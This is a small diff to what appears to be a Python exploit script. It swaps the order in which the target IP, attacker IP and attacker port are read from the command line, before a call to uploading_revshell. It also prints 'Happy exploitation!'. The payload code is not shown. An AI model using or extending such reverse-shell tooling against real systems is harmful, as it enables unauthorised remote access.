@@ -81,9 +81,9 @@ if __name__ == "__main__":
         print('\n~ Happy exploitation!')
         sys.exit(1)
 
-    target_ip = sys.argv[1]
+    attacker_ip = sys.argv[1]
     attacker_port = sys.argv[2]
-    attacker_ip = sys.argv[3]
+    target_ip = sys.argv[3]
     
     uploading_revshell(target_ip, attacker_ip, attacker_port)
 
